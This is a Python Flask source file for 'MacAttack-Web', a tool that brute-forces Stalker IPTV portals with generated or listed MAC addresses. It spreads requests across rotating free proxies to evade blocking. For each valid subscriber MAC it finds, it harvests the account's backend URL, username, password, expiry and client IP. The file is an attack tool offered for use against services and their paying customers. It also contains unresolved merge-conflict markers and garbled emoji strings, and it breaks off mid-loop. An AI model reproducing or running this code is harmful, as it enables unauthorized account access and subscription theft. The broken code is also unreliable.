"""
MacAttack-Web - Web-based MAC Address Testing Tool for Stalker Portals
A Flask-based Linux/Docker version of MacAttack with Web UI
Features: Multi-Portal Scanning, Proxy Management, Quick Scan, Load Balancing
"""
import os
import json
import logging
import random
import time
import threading
import secrets
import re
import hashlib
from datetime import datetime
from functools import wraps
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import contextmanager
from collections import defaultdict

from flask import Flask, render_template, request, jsonify, Response
import requests
import waitress

import stb
import atexit
from concurrent.futures import ThreadPoolExecutor, as_completed

VERSION = "1.4.0"

# Logging setup
logger = logging.getLogger("MacAttack")
logger.setLevel(logging.INFO)
logFormat = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")

if os.getenv("CONFIG"):
    configFile = os.getenv("CONFIG")
    log_dir = os.path.dirname(configFile)
else:
    log_dir = "./data"
    configFile = os.path.join(log_dir, "macattack.json")
    
proxy_semaphores = {}  # Globaler Speicher für Proxy-Limits

os.makedirs(log_dir, exist_ok=True)
os.makedirs("./logs", exist_ok=True)

log_file_path = os.path.join("./logs", "macattack.log")
fileHandler = logging.FileHandler(log_file_path)
fileHandler.setFormatter(logFormat)
logger.addHandler(fileHandler)

consoleHandler = logging.StreamHandler()
consoleHandler.setFormatter(logging.Formatter("[%(levelname)s] %(message)s"))
logger.addHandler(consoleHandler)

app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(32)
app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024  # 500MB max upload

host = os.getenv("HOST", "0.0.0.0:5002")
logger.info(f"Server will start on http://{host}")

# Global state
config = {}

# 2. ADD GLOBAL EXECUTOR (after other globals)
_global_executor = None
_executor_lock = threading.Lock()

def get_global_executor(max_workers=100):
    """Get or create global ThreadPoolExecutor - NEVER shutdown during runtime."""
    global _global_executor
    if _global_executor is None:
        with _executor_lock:
            if _global_executor is None:
                _global_executor = ThreadPoolExecutor(max_workers=max_workers)
                logger.info(f"Global ThreadPoolExecutor created with {max_workers} workers")
    return _global_executor

def shutdown_global_executor():
    """Only called on app exit via atexit."""
    global _global_executor
    if _global_executor:
        logger.info("Shutting down global executor...")
        _global_executor.shutdown(wait=False)
        _global_executor = None

# Register cleanup
atexit.register(shutdown_global_executor)



# Multi-portal attack states
attack_states = {}  # portal_id -> attack_state
attack_states_lock = threading.Lock()

# Global proxy error tracking
proxy_error_counts = defaultdict(int)
MAX_PROXY_ERRORS = 5

proxy_state = {
    "fetching": False,
    "testing": False,
    "proxies": [],
    "working_proxies": [],
    "failed_proxies": [],
    "logs": []
}

# Default settings
defaultSettings = {
    "speed": 10,
    "timeout": 10,
    "use_proxies": False,
    "proxy_rotation": True,
    "mac_prefix": "00:1A:79:",
    "output_format": "mac_only",
    "auto_save": True,
    "max_proxy_errors": 3,
    "proxy_test_threads": 50,
    "unlimited_mac_retries": True,
    "max_mac_retries": 3,
<<<<<<< Updated upstream
    "session_max_retries": 0,  # NEW: Control requests retries (0 = disable)
    "session_connect_timeout": 5,  # NEW: Connect timeout
    "session_read_timeout": 10,  # NEW: Read timeout
=======
    "proxy_connections_per_portal": 5,  # Max concurrent connections per proxy per portal
>>>>>>> Stashed changes
}

# Default proxy sources
DEFAULT_PROXY_SOURCES = [
    "https://spys.me/proxy.txt",
    "https://free-proxy-list.net/",
    "https://www.us-proxy.org/",
    "https://www.sslproxies.org/",
]


# ============== BASIC AUTH ==============

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()


def check_auth(username, password):
    auth = config.get("auth", {})
    if not auth.get("enabled", False):
        return True
    stored_user = auth.get("username", "")
    stored_hash = auth.get("password_hash", "")
    return username == stored_user and hash_password(password) == stored_hash


def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = config.get("auth", {})
        if not auth.get("enabled", False):
            return f(*args, **kwargs)
        request_auth = request.authorization
        if not request_auth or not check_auth(request_auth.username, request_auth.password):
            return Response('Authentication required', 401,
                {'WWW-Authenticate': 'Basic realm="MacAttack-Web"'})
        return f(*args, **kwargs)
    return decorated


def load_config():
    global config
    try:
        with open(configFile) as f:
            config = json.load(f)
        logger.info(f"Config loaded from {configFile}")
    except FileNotFoundError:
        logger.warning("No config found, creating default")
        config = {}
    except Exception as e:
        logger.error(f"Error loading config: {e}")
        config = {}
    
    config.setdefault("settings", {})
    config.setdefault("found_macs", [])
    config.setdefault("proxies", [])
    config.setdefault("portals", [])
    config.setdefault("mac_list", [])
    config.setdefault("mac_list_2", [])  # Second MAC list
    config.setdefault("proxy_sources", DEFAULT_PROXY_SOURCES.copy())
    config.setdefault("auth", {"enabled": False, "username": "", "password_hash": ""})
    
    for key, default in defaultSettings.items():
        config["settings"].setdefault(key, default)
    
    save_config()
    return config


def save_config():
    try:
        with open(configFile, "w") as f:
            json.dump(config, f, indent=4)
    except Exception as e:
        logger.error(f"Error saving config: {e}")


def get_settings():
    if not config:
        load_config()
    return config.get("settings", defaultSettings)


def generate_mac(prefix="00:1A:79:"):
    suffix = ":".join([f"{random.randint(0, 255):02X}" for _ in range(3)])
    return f"{prefix}{suffix}"


def add_log(state, message, level="info"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    state["logs"].append({"time": timestamp, "level": level, "message": message})
    if len(state["logs"]) > 500:
        state["logs"] = state["logs"][-500:]


@contextmanager
def no_proxy_environment():
    original_http = os.environ.get("http_proxy")
    original_https = os.environ.get("https_proxy")
    try:
        if "http_proxy" in os.environ:
            del os.environ["http_proxy"]
        if "https_proxy" in os.environ:
            del os.environ["https_proxy"]
        yield
    finally:
        if original_http:
            os.environ["http_proxy"] = original_http
        if original_https:
            os.environ["https_proxy"] = original_https



# ============== ROUTES ==============

@app.route("/")
@requires_auth
def index():
    auth = config.get("auth", {})
    if not auth.get("enabled", False) and not auth.get("setup_skipped", False):
        return render_template("setup.html", version=VERSION)
    return render_template("index.html", version=VERSION)


@app.route("/setup", methods=["GET", "POST"])
def setup():
    auth = config.get("auth", {})
    if auth.get("enabled", False):
        return Response("Already configured", 302, {"Location": "/"})
    
    if request.method == "POST":
        data = request.json or request.form
        username = data.get("username", "").strip()
        password = data.get("password", "").strip()
        skip = data.get("skip", False)
        
        if skip:
            config["auth"] = {"enabled": False, "setup_skipped": True}
            save_config()
            return jsonify({"success": True, "message": "Setup skipped"})
        
        if not username or not password:
            return jsonify({"success": False, "error": "Username and password required"})
        
        if len(password) < 4:
            return jsonify({"success": False, "error": "Password must be at least 4 characters"})
        
        config["auth"] = {
            "enabled": True,
            "username": username,
            "password_hash": hash_password(password)
        }
        save_config()
        return jsonify({"success": True, "message": "Authentication configured"})
    
    return render_template("setup.html", version=VERSION)


@app.route("/api/auth/status")
def api_auth_status():
    auth = config.get("auth", {})
    return jsonify({
        "enabled": auth.get("enabled", False),
        "setup_required": not auth.get("enabled", False) and not auth.get("setup_skipped", False)
    })


@app.route("/api/auth/change", methods=["POST"])
@requires_auth
def api_auth_change():
    data = request.json
    action = data.get("action", "")
    
    if action == "disable":
        config["auth"] = {"enabled": False, "setup_skipped": True}
        save_config()
        return jsonify({"success": True, "message": "Authentication disabled"})
    
    if action == "change":
        username = data.get("username", "").strip()
        password = data.get("password", "").strip()
        
        if not username or not password:
            return jsonify({"success": False, "error": "Username and password required"})
        
        config["auth"] = {
            "enabled": True,
            "username": username,
            "password_hash": hash_password(password)
        }
        save_config()
        return jsonify({"success": True, "message": "Credentials updated"})
    
    return jsonify({"success": False, "error": "Invalid action"})


@app.route("/api/settings", methods=["GET", "POST"])
@requires_auth
def api_settings():
    if request.method == "GET":
        return jsonify(get_settings())
    
    data = request.json
    settings = get_settings()
    for key in data:
        if key in settings:
            settings[key] = data[key]
    config["settings"] = settings
    save_config()
    return jsonify({"success": True, "settings": settings})


# ============== PORTALS MANAGEMENT ==============

@app.route("/api/portals", methods=["GET", "POST"])
@requires_auth
def api_portals():
    if request.method == "GET":
        return jsonify(config.get("portals", []))
    
    data = request.json
    portal = {
        "id": secrets.token_hex(8),
        "name": data.get("name", "").strip(),
        "url": data.get("url", "").strip(),
        "enabled": data.get("enabled", True),
        "created_at": datetime.now().isoformat()
    }
    
    if portal["url"] and not portal["url"].startswith("http"):
        portal["url"] = f"http://{portal['url']}"
    if not portal["name"]:
        portal["name"] = portal["url"]
    
    config["portals"].append(portal)
    save_config()
    return jsonify({"success": True, "portal": portal})


@app.route("/api/portals/<portal_id>", methods=["PUT", "DELETE"])
@requires_auth
def api_portal_manage(portal_id):
    portals = config.get("portals", [])
    
    if request.method == "DELETE":
        config["portals"] = [p for p in portals if p.get("id") != portal_id]
        save_config()
        return jsonify({"success": True})
    
    if request.method == "PUT":
        data = request.json
        for portal in portals:
            if portal.get("id") == portal_id:
                portal["name"] = data.get("name", portal["name"])
                portal["url"] = data.get("url", portal["url"])
                portal["enabled"] = data.get("enabled", portal["enabled"])
                break
        save_config()
        return jsonify({"success": True})


# ============== MAC LIST MANAGEMENT ==============

@app.route("/api/maclist", methods=["GET", "POST", "DELETE"])
@requires_auth
def api_maclist():
    list_id = request.args.get("list", "1")  # Support list 1 or 2
    list_key = "mac_list" if list_id == "1" else "mac_list_2"
    
    if request.method == "GET":
        return jsonify({
            "macs": config.get(list_key, []), 
            "count": len(config.get(list_key, [])),
            "list_id": list_id
        })
    
    if request.method == "POST":
        data = request.json
        macs_text = data.get("macs", "")
        macs = []
        for line in macs_text.strip().split("\n"):
            mac = line.strip().upper()
            if mac and len(mac) >= 11:
                mac = mac.replace("-", ":").replace(".", ":")
                if mac not in macs:
                    macs.append(mac)
        config[list_key] = macs
        save_config()
        return jsonify({"success": True, "count": len(macs), "list_id": list_id})
    
    if request.method == "DELETE":
        config[list_key] = []
        save_config()
        return jsonify({"success": True, "list_id": list_id})


@app.route("/api/maclist/import", methods=["POST"])
@requires_auth
def api_maclist_import():
    if "file" not in request.files:
        return jsonify({"success": False, "error": "No file uploaded"})
    
    file = request.files["file"]
    append_mode = request.form.get("append", "true").lower() == "true"
    list_id = request.form.get("list", "1")
    list_key = "mac_list" if list_id == "1" else "mac_list_2"
    
    content = file.read().decode("utf-8", errors="ignore")
    lines = content.strip().split("\n")
    total_lines = len(lines)
    
    logger.info(f"Processing {total_lines} lines from MAC import (list={list_id}, append={append_mode})...")
    
    if append_mode:
        existing_macs = set(config.get(list_key, []))
        existing_count = len(existing_macs)
    else:
        existing_macs = set()
        existing_count = 0
    
    new_macs = set()
    invalid = 0
    
    for line in lines:
        mac = line.strip().upper()
        if mac and len(mac) >= 11:
            mac = mac.replace("-", ":").replace(".", ":")
            if len(mac) == 17 and mac.count(':') == 5:
                if mac not in existing_macs:
                    new_macs.add(mac)
            else:
                invalid += 1
        elif mac:
            invalid += 1
    
    all_macs = list(existing_macs | new_macs)
    duplicates = total_lines - len(new_macs) - invalid
    
    config[list_key] = all_macs
    save_config()
    
    logger.info(f"MAC import complete: {len(new_macs)} new MACs added, {len(all_macs)} total")
    
    return jsonify({
        "success": True, 
        "count": len(all_macs),
        "new_count": len(new_macs),
        "existing_count": existing_count,
        "total_lines": total_lines,
        "duplicates": max(0, duplicates),
        "invalid": invalid,
        "list_id": list_id
    })



# ============== MULTI-PORTAL ATTACK ==============

class ProxyManager:
    """Per-portal proxy management with load balancing and state tracking."""
    
    def __init__(self, proxies, max_errors=3, max_connections_per_proxy=5):
        self.all_proxies = list(proxies) if proxies else []
        self.max_errors = max_errors
        self.max_connections = max_connections_per_proxy
        
        # Per-proxy state
        self.error_counts = defaultdict(int)  # proxy -> error count
        self.blocked_proxies = set()  # Proxies blocked by portal
        self.dead_proxies = set()  # Proxies that are completely dead
        self.disabled_proxies = set()  # Proxies disabled due to errors
        self.connection_counts = defaultdict(int)  # proxy -> current connections
        
        # Round-robin index for load balancing
        self.current_index = 0
        self.lock = threading.Lock()
    
    def get_stats(self):
        """Get proxy statistics."""
        with self.lock:
            active = len([p for p in self.all_proxies 
                         if p not in self.disabled_proxies 
                         and p not in self.blocked_proxies 
                         and p not in self.dead_proxies])
            return {
                "total": len(self.all_proxies),
                "active": active,
                "blocked": len(self.blocked_proxies),
                "dead": len(self.dead_proxies),
                "disabled": len(self.disabled_proxies),
            }
    
    def get_working_proxies(self):
        """Get list of currently working proxies."""
        with self.lock:
            return [p for p in self.all_proxies 
                    if p not in self.disabled_proxies 
                    and p not in self.blocked_proxies 
                    and p not in self.dead_proxies]
    
    def get_next_proxy(self):
        """Get next proxy using round-robin load balancing."""
        with self.lock:
            working = self.get_working_proxies()
            if not working:
                return None
            
            # Find proxy with lowest connection count
            min_connections = float('inf')
            best_proxy = None
            
            for i in range(len(working)):
                idx = (self.current_index + i) % len(working)
                proxy = working[idx]
                conn_count = self.connection_counts[proxy]
                
                if conn_count < self.max_connections and conn_count < min_connections:
                    min_connections = conn_count
                    best_proxy = proxy
                    self.current_index = (idx + 1) % len(working)
                    break
            
            if best_proxy:
                self.connection_counts[best_proxy] += 1
            
            return best_proxy
    
    def release_proxy(self, proxy):
        """Release a proxy connection."""
        with self.lock:
            if proxy and self.connection_counts[proxy] > 0:
                self.connection_counts[proxy] -= 1
    
    def mark_error(self, proxy, is_blocked=False, is_dead=False):
        """Mark proxy error and potentially disable it."""
        with self.lock:
            if not proxy:
                return
            
            if is_dead:
                self.dead_proxies.add(proxy)
                self.disabled_proxies.add(proxy)
                return "dead"
            
            if is_blocked:
                self.blocked_proxies.add(proxy)
                self.disabled_proxies.add(proxy)
                return "blocked"
            
            self.error_counts[proxy] += 1
            if self.error_counts[proxy] >= self.max_errors:
                self.disabled_proxies.add(proxy)
                return "disabled"
            
            return "error"
    
    def mark_success(self, proxy):
        """Mark successful proxy use - reduce error count."""
        with self.lock:
            if proxy and self.error_counts[proxy] > 0:
                self.error_counts[proxy] = max(0, self.error_counts[proxy] - 1)
    
    def reset(self):
        """Reset all proxy states (for resume)."""
        with self.lock:
            self.error_counts.clear()
            self.blocked_proxies.clear()
            self.dead_proxies.clear()
            self.disabled_proxies.clear()
            self.connection_counts.clear()
            self.current_index = 0
    
    def reload_proxies(self, new_proxies):
        """Reload proxy list (keeps state for existing proxies)."""
        with self.lock:
            # Add new proxies
            new_set = set(new_proxies)
            old_set = set(self.all_proxies)
            
            # Add new proxies
            for p in new_set - old_set:
                self.all_proxies.append(p)
            
            # Remove proxies that are no longer in list
            self.all_proxies = [p for p in self.all_proxies if p in new_set]
    
    def has_working_proxies(self):
        """Check if any working proxies are available."""
        return len(self.get_working_proxies()) > 0


def create_attack_state(portal_id, portal_url, mode="random", mac_list_id="1"):
    """Create a new attack state for a portal."""
    return {
        "id": portal_id,
        "running": True,
        "paused": False,
        "stopped": False,  # Explicitly stopped (can resume)
        "tested": 0,
        "hits": 0,
        "errors": 0,
        "current_mac": "",
        "current_proxy": "",
        "found_macs": [],
        "logs": [],
        "start_time": time.time(),
        "portal_url": portal_url,
        "mode": mode,
        "mac_list_id": mac_list_id,
        "mac_list_index": 0,
        "mac_list_total": 0,
        "scanned_macs": set(),  # Track scanned MACs for random mode
        "proxy_stats": {"total": 0, "active": 0, "blocked": 0, "dead": 0, "disabled": 0},
        "auto_paused": False,  # Paused due to no proxies
    }


@app.route("/api/attack/start", methods=["POST"])
@requires_auth
def api_attack_start():
    data = request.json
    portal_urls = data.get("urls", [])
    single_url = data.get("url", "").strip()
    mode = data.get("mode", "random")
    mac_list_id = data.get("mac_list", "1")  # Which MAC list to use
    
    if single_url and not portal_urls:
        portal_urls = [single_url]
    
    if not portal_urls:
        return jsonify({"success": False, "error": "Portal URL(s) required"})
    
    list_key = "mac_list" if mac_list_id == "1" else "mac_list_2"
    
    if mode == "list" and not config.get(list_key):
        return jsonify({"success": False, "error": f"MAC list {mac_list_id} is empty"})
    
    if mode == "refresh":
        found_macs = config.get("found_macs", [])
        if not found_macs:
            return jsonify({"success": False, "error": "No found MACs to refresh"})
    
    started = []
    for url in portal_urls:
        if not url.startswith("http"):
            url = f"http://{url}"
        
        detected_url, portal_type, version = stb.auto_detect_portal_url(url)
        if detected_url:
            url = detected_url
            logger.info(f"Auto-detected portal: {url} (type: {portal_type}, version: {version})")
        
        portal_id = secrets.token_hex(4)
        
        with attack_states_lock:
            attack_states[portal_id] = create_attack_state(portal_id, url, mode, mac_list_id)
        
        add_log(attack_states[portal_id], f"Starting attack on {url}", "info")
        
        thread = threading.Thread(target=run_attack, args=(portal_id,), daemon=True)
        thread.start()
        
        started.append({"id": portal_id, "url": url})
    
    return jsonify({"success": True, "attacks": started})


@app.route("/api/attack/stop", methods=["POST"])
@requires_auth
def api_attack_stop():
    data = request.json
    portal_id = data.get("id")
    
    with attack_states_lock:
        if portal_id:
            if portal_id in attack_states:
                attack_states[portal_id]["running"] = False
                attack_states[portal_id]["stopped"] = True
                add_log(attack_states[portal_id], "Attack stopped", "warning")
        else:
            for state in attack_states.values():
                state["running"] = False
                state["stopped"] = True
                add_log(state, "Attack stopped", "warning")
    
    return jsonify({"success": True})


@app.route("/api/attack/pause", methods=["POST"])
@requires_auth
def api_attack_pause():
    data = request.json
    portal_id = data.get("id")
    
    with attack_states_lock:
        if portal_id and portal_id in attack_states:
            state = attack_states[portal_id]
            state["paused"] = not state["paused"]
            state["auto_paused"] = False  # Clear auto-pause flag
            status = "paused" if state["paused"] else "resumed"
            add_log(state, f"Attack {status}", "info")
            return jsonify({"success": True, "paused": state["paused"]})
    
    return jsonify({"success": False})


@app.route("/api/attack/resume", methods=["POST"])
@requires_auth
def api_attack_resume():
    """Resume a stopped attack with fresh proxy state."""
    data = request.json
    portal_id = data.get("id")
    
    with attack_states_lock:
        if portal_id and portal_id in attack_states:
            state = attack_states[portal_id]
            if state.get("stopped") or not state.get("running"):
                # Restart the attack
                state["running"] = True
                state["stopped"] = False
                state["paused"] = False
                state["auto_paused"] = False
                add_log(state, "Attack resumed with fresh proxy state", "info")
                
                # Start new thread
                thread = threading.Thread(target=run_attack, args=(portal_id,), daemon=True)
                thread.start()
                
                return jsonify({"success": True})
    
    return jsonify({"success": False, "error": "Attack not found or already running"})


@app.route("/api/attack/status")
@requires_auth
def api_attack_status():
    portal_id = request.args.get("id")
    
    with attack_states_lock:
        if portal_id:
            state = attack_states.get(portal_id, {})
            if state:
                elapsed = int(time.time() - state.get("start_time", time.time()))
                return jsonify({
                    "id": portal_id,
                    "running": state.get("running", False),
                    "paused": state.get("paused", False),
                    "stopped": state.get("stopped", False),
                    "auto_paused": state.get("auto_paused", False),
                    "tested": state.get("tested", 0),
                    "hits": state.get("hits", 0),
                    "errors": state.get("errors", 0),
                    "current_mac": state.get("current_mac", ""),
                    "current_proxy": state.get("current_proxy", ""),
                    "found_macs": state.get("found_macs", [])[-50:],
                    "logs": state.get("logs", [])[-100:],
                    "elapsed": elapsed,
                    "mode": state.get("mode", "random"),
                    "mac_list_id": state.get("mac_list_id", "1"),
                    "mac_list_index": state.get("mac_list_index", 0),
                    "mac_list_total": state.get("mac_list_total", 0),
                    "portal_url": state.get("portal_url", ""),
                    "proxy_stats": state.get("proxy_stats", {}),
                })
        
        all_attacks = []
        for pid, state in attack_states.items():
            elapsed = int(time.time() - state.get("start_time", time.time()))
            all_attacks.append({
                "id": pid,
                "running": state.get("running", False),
                "paused": state.get("paused", False),
                "stopped": state.get("stopped", False),
                "auto_paused": state.get("auto_paused", False),
                "tested": state.get("tested", 0),
                "hits": state.get("hits", 0),
                "errors": state.get("errors", 0),
                "current_mac": state.get("current_mac", ""),
                "current_proxy": state.get("current_proxy", ""),
                "found_macs": state.get("found_macs", [])[-20:],
                "logs": state.get("logs", [])[-50:],
                "elapsed": elapsed,
                "portal_url": state.get("portal_url", ""),
                "mode": state.get("mode", "random"),
                "mac_list_id": state.get("mac_list_id", "1"),
                "mac_list_index": state.get("mac_list_index", 0),
                "mac_list_total": state.get("mac_list_total", 0),
                "proxy_stats": state.get("proxy_stats", {}),
            })
        
        return jsonify({"attacks": all_attacks})


@app.route("/api/attack/clear", methods=["POST"])
@requires_auth
def api_attack_clear():
    with attack_states_lock:
        finished = [pid for pid, state in attack_states.items() if not state.get("running")]
        for pid in finished:
            del attack_states[pid]
    return jsonify({"success": True, "cleared": len(finished)})



def run_attack(portal_id):
<<<<<<< Updated upstream
    """
    Optimized MAC attack with:
    - Global executor (no shutdown)
    - Quick scan (early exit)
    - Configurable retries & timeouts
    """
    global proxy_error_counts
=======
    """Run the MAC attack for a specific portal with improved proxy handling."""
>>>>>>> Stashed changes
    
    with attack_states_lock:
        if portal_id not in attack_states:
            return
        state = attack_states[portal_id]
    
    portal_url = state["portal_url"]
    mode = state.get("mode", "random")
    mac_list_id = state.get("mac_list_id", "1")
    
    # Get settings (will be reloaded each iteration for dynamic changes)
    def get_current_settings():
        return get_settings()
    
    settings = get_current_settings()
    speed = settings.get("speed", 10)
    timeout = settings.get("timeout", 10)
    use_proxies = settings.get("use_proxies", False)
    mac_prefix = settings.get("mac_prefix", "00:1A:79:")
    max_proxy_errors = settings.get("max_proxy_errors", 3)
    unlimited_mac_retries = settings.get("unlimited_mac_retries", True)
    max_mac_retries = settings.get("max_mac_retries", 3)
    proxy_connections = settings.get("proxy_connections_per_portal", 5)
    
<<<<<<< Updated upstream
    # Use GLOBAL executor - NEVER call shutdown()!
    executor = get_global_executor(max_workers=100)
    
    proxy_index = 0
    
    # Build MAC list
=======
    # Initialize proxy manager
    initial_proxies = config.get("proxies", []) if use_proxies else []
    proxy_manager = ProxyManager(initial_proxies, max_proxy_errors, proxy_connections)
    
    # Build MAC list based on mode
    list_key = "mac_list" if mac_list_id == "1" else "mac_list_2"
    
>>>>>>> Stashed changes
    if mode == "list":
        mac_list = list(config.get(list_key, []))
    elif mode == "refresh":
        found_macs = config.get("found_macs", [])
        portal_normalized = portal_url.rstrip('/').lower()
        mac_list = []
        for m in found_macs:
            mac_portal = (m.get("portal") or "").rstrip('/').lower()
            if mac_portal == portal_normalized or portal_normalized in mac_portal or mac_portal in portal_normalized:
                mac_list.append(m.get("mac"))
        mac_list = [m for m in mac_list if m]
    else:
        mac_list = []
    
<<<<<<< Updated upstream
    mac_list_index = 0
    mac_retry_counts = defaultdict(int)
    retry_queue = []
    
    add_log(state, f"Attack started: {speed} threads, mode: {mode}, timeout: {timeout}s", "info")
    
    if unlimited_mac_retries:
        add_log(state, "Unlimited MAC retries enabled", "info")
    else:
        add_log(state, f"Max {max_mac_retries} retries per MAC", "info")
    
    if mode in ("list", "refresh"):
        add_log(state, f"MAC list: {len(mac_list)} entries", "info")
        state["mac_list_total"] = len(mac_list)
        if len(mac_list) == 0:
            add_log(state, "WARNING: MAC list is empty!", "warning")
            state["running"] = False
            return
    else:
        add_log(state, f"Random MACs with prefix: {mac_prefix}", "info")
    
    if use_proxies:
        initial_proxies = config.get("proxies", [])
        if initial_proxies:
            add_log(state, f"Using {len(initial_proxies)} proxies", "info")
        else:
            add_log(state, "WARNING: Use Proxies enabled but no proxies!", "warning")
    
    futures = {}
    list_exhausted = False
    
    while state["running"]:
        # Pause handling
        while state["paused"] and state["running"]:
            time.sleep(0.5)
        
        if not state["running"]:
            break
        
        # Reload proxies dynamically
        proxies = config.get("proxies", []) if use_proxies else []
        
        # Check if list exhausted
        if mode in ("list", "refresh") and mac_list_index >= len(mac_list) and not retry_queue:
            if not list_exhausted:
                add_log(state, f"MAC list exhausted ({mac_list_index} submitted). Waiting...", "info")
                list_exhausted = True
            if not futures:
                break
        
        # Submit new MACs
        if not list_exhausted or retry_queue:
            while len(futures) < speed and state["running"]:
                mac = None
                is_retry = False
                
                if retry_queue:
                    mac = retry_queue.pop(0)
                    is_retry = True
                elif mode in ("list", "refresh"):
                    if mac_list_index >= len(mac_list):
=======
    mac_list_index = state.get("mac_list_index", 0)  # Resume from last position
    state["mac_list_total"] = len(mac_list) if mode in ("list", "refresh") else 0
    
    # Track retry counts per MAC
    mac_retry_counts = defaultdict(int)
    retry_queue = []
    
    # Log startup info
    add_log(state, f"Attack started with {speed} threads, mode: {mode}", "info")
    if use_proxies:
        stats = proxy_manager.get_stats()
        add_log(state, f"Using {stats['total']} proxies (max {proxy_connections} connections each)", "info")
        state["proxy_stats"] = stats
    
    if unlimited_mac_retries:
        add_log(state, "Unlimited MAC retries enabled", "info")
    else:
        add_log(state, f"Max {max_mac_retries} retries per MAC", "info")
    
    if mode == "list":
        add_log(state, f"MAC list {mac_list_id} has {len(mac_list)} entries", "info")
    elif mode == "refresh":
        add_log(state, f"Refreshing {len(mac_list)} found MACs", "info")
    else:
        add_log(state, f"Random mode with prefix: {mac_prefix}", "info")
    
    with ThreadPoolExecutor(max_workers=speed) as executor:
        futures = {}
        list_exhausted = False
        last_settings_check = time.time()
        
        while state["running"]:
            # Handle pause
            while state["paused"] and state["running"]:
                time.sleep(0.5)
                # Check if proxies were added during pause
                if use_proxies:
                    new_proxies = config.get("proxies", [])
                    proxy_manager.reload_proxies(new_proxies)
                    if state.get("auto_paused") and proxy_manager.has_working_proxies():
                        state["paused"] = False
                        state["auto_paused"] = False
                        add_log(state, "Resuming - new proxies available", "info")
            
            if not state["running"]:
                break
            
            # Reload settings periodically (every 5 seconds)
            if time.time() - last_settings_check > 5:
                settings = get_current_settings()
                timeout = settings.get("timeout", 10)
                max_proxy_errors = settings.get("max_proxy_errors", 3)
                unlimited_mac_retries = settings.get("unlimited_mac_retries", True)
                max_mac_retries = settings.get("max_mac_retries", 3)
                last_settings_check = time.time()
                
                # Reload proxies
                if use_proxies:
                    new_proxies = config.get("proxies", [])
                    proxy_manager.reload_proxies(new_proxies)
            
            # Update proxy stats
            if use_proxies:
                state["proxy_stats"] = proxy_manager.get_stats()
            
            # Check if list exhausted
            if mode in ("list", "refresh") and mac_list_index >= len(mac_list) and not retry_queue:
                if not list_exhausted:
                    add_log(state, f"MAC list exhausted ({mac_list_index} submitted). Waiting for results...", "info")
                    list_exhausted = True
                if not futures:
                    break
            
            # Check if all proxies exhausted
            if use_proxies and not proxy_manager.has_working_proxies() and not state["auto_paused"]:
                add_log(state, "⚠ All proxies exhausted! Auto-pausing. Add proxies and resume.", "warning")
                state["paused"] = True
                state["auto_paused"] = True
                continue
            
            # Add new MACs to test
            if not list_exhausted or retry_queue:
                while len(futures) < speed and state["running"]:
                    mac = None
                    is_retry = False
                    
                    # First check retry queue
                    if retry_queue:
                        mac = retry_queue.pop(0)
                        is_retry = True
                    elif mode in ("list", "refresh"):
                        if mac_list_index >= len(mac_list):
                            break
                        mac = mac_list[mac_list_index]
                        mac_list_index += 1
                        state["mac_list_index"] = mac_list_index
                    else:
                        # Random mode - generate new MAC
                        mac = generate_mac(mac_prefix)
                        # Skip if already scanned in this session
                        attempts = 0
                        while mac in state["scanned_macs"] and attempts < 100:
                            mac = generate_mac(mac_prefix)
                            attempts += 1
                        state["scanned_macs"].add(mac)
                    
                    if not mac:
>>>>>>> Stashed changes
                        break
                    mac = mac_list[mac_list_index]
                    mac_list_index += 1
                    state["mac_list_index"] = mac_list_index
                else:
                    mac = generate_mac(mac_prefix)
                
                if not mac:
                    break
                
                proxy = None
                if proxies:
                    working_proxies = [p for p in proxies if proxy_error_counts[p] < max_proxy_errors]
                    if not working_proxies:
                        add_log(state, "Ã¢Å¡  All proxies failed! Resetting...", "warning")
                        proxy_error_counts.clear()
                        working_proxies = proxies
                    proxy = working_proxies[proxy_index % len(working_proxies)]
                    proxy_index += 1
                    state["current_proxy"] = proxy
                
                proxy_info = f" via {proxy}" if proxy else ""
                retry_info = f" (retry {mac_retry_counts[mac]})" if is_retry else ""
                add_log(state, f"Testing {mac}{proxy_info}{retry_info}", "info")
                
                # Submit to GLOBAL executor
                future = executor.submit(test_mac_worker, portal_url, mac, proxy, timeout)
                futures[future] = (mac, proxy)
        
        # Process completed futures
        done_futures = [f for f in futures if f.done()]
        
        for future in done_futures:
            mac, proxy = futures.pop(future)
            try:
                success, result = future.result()
                state["tested"] += 1
                state["current_mac"] = mac
                
                proxy_info = f" via {proxy}" if proxy else ""
                
                if success:
                    state["hits"] += 1
                    
<<<<<<< Updated upstream
                    expiry = result.get("expiry", "Unknown")
                    channels = result.get("channels", 0)
                    genres = result.get("genres", [])
                    
                    de_channels = [g for g in genres if g.upper().startswith("DE") or "GERMAN" in g.upper() or "DEUTSCH" in g.upper()]
                    has_de = len(de_channels) > 0
                    
                    state["found_macs"].append({
                        "mac": mac,
                        "expiry": expiry,
                        "channels": channels,
                        "has_de": has_de,
                        "time": datetime.now().strftime("%H:%M:%S")
                    })
                    
                    de_info = " Ã°Å¸â¡Â©Ã°Å¸â¡Âª" if has_de else ""
                    add_log(state, f"Ã°Å¸Å½Â¯ HIT! {mac} - Expiry: {expiry} - Channels: {channels}{de_info}{proxy_info}", "success")
                    
                    # Save to config
                    found_entry = {
                        "mac": mac,
                        "expiry": expiry,
                        "portal": portal_url,
                        "channels": channels,
                        "genres": genres,
                        "has_de": has_de,
                        "de_genres": de_channels,
                        "vod_categories": result.get("vod_categories", []),
                        "series_categories": result.get("series_categories", []),
                        "backend_url": result.get("backend_url"),
                        "username": result.get("username"),
                        "password": result.get("password"),
                        "max_connections": result.get("max_connections"),
                        "created_at": result.get("created_at"),
                        "client_ip": result.get("client_ip"),
                        "found_at": datetime.now().isoformat()
                    }
                    
                    # Check duplicates
                    existing_idx = None
                    for idx, existing in enumerate(config["found_macs"]):
                        if existing.get("mac") == mac and existing.get("portal") == portal_url:
                            existing_idx = idx
                            break
                    
                    if existing_idx is not None:
                        config["found_macs"][existing_idx] = found_entry
                    else:
                        config["found_macs"].append(found_entry)
                    
                    if settings.get("auto_save", True):
                        save_config()
                    
                    if mac in mac_retry_counts:
                        del mac_retry_counts[mac]
                else:
                    add_log(state, f"Ã¢Åâ {mac} - No valid account{proxy_info}", "info")
                    if mac in mac_retry_counts:
                        del mac_retry_counts[mac]
            
